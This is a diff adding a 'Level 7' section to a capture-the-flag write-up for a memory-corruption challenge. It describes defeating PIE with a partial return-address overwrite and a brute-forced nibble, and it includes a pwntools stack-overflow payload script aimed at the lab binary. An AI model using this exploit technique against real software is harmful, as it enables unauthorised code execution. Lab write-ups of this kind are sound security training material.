@@ -84,3 +84,35 @@ proc.read(4096)
 Here is the flag. 
 
 ![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L6-test1-1.PNG?raw=true)
+
+
+
+## Level 7
+
+In this level, PIE (Position Independent Executable) is enabled, which means we don't know the exact address of our target. However, since the program is aligned on a 4 KB boundary, we can just overwrite the offset. So let's use objdump to find out the related address and buffer size: original return address at 0x16e0, target return address at 0x147d and buffer size is 0x90.  
+
+![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L7-test2-3.PNG?raw=true)
+
+![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L7-test2-2.PNG?raw=true)
+
+![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L7-test2-4.PNG?raw=true)
+
+As I mentioned above, the program is aligned to a 4 KB (0x1000) alignment, which means the last 3 bits are fixed. So the return address should be overwritten as follows. The symbol "-" means do not change. We can use brute-force method to solve the third nibble (the symbol "?"). For example, try \x24 for several times, and we may land on the correct address. 
+
+|      | 15   | 14   | 13   | 12   | 11   | 10   | 9    | 8    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    |
+| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
+| 0x   | -    | -    | -    | -    | -    | -    | -    | -    | -    | -    | -    | -    | ?    | 4    | 7    | d    |
+
+So the payload is:
+
+```python
+import pwn 
+pwn.context(arch='amd64')
+proc = pwn.process("./babymem_level7_testing2")
+payload = b"a" * (0x90 + 8) + b"\x7d\x24"        # notice the little-endian style
+proc.read(); proc.sendline("154"); proc.read(); proc.sendline(payload); proc.read(); 
+```
+
+Here is the flag. 
+
+![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L7-test2-1.PNG?raw=true)
